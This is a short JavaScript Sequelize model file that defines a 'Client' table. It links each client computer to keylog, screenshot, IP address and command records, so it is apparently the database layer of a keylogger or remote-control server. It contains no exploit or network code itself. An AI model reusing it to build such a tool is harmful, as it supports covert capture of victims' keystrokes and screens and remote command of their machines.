'use strict'

const { Model, DataTypes } = require('sequelize')

class Client extends Model { }

Client.initialize = function (sequelize) {
    Client.init({
        id: { type: DataTypes.INTEGER, autoIncrement: true, primaryKey: true },
        uuid: { type: DataTypes.UUID, allowNull: false, unique: true },
        computerName: { type: DataTypes.TEXT, allowNull: false, unique: false }
    },
        {
            sequelize,
            modelName: 'Client',
            tableName: 'Clients'
        })
}

Client.associate = function (models) {

    Client.hasMany(models.IP_Address, { foreignKey: 'fk_clientId' })
    Client.hasMany(models.Keylog, { foreignKey: 'fk_clientId' })
    Client.hasMany(models.Screenshot, { foreignKey: 'fk_clientId' })
    Client.hasMany(models.Command, { foreignKey: 'fk_clientId' })
}

module.exports = Client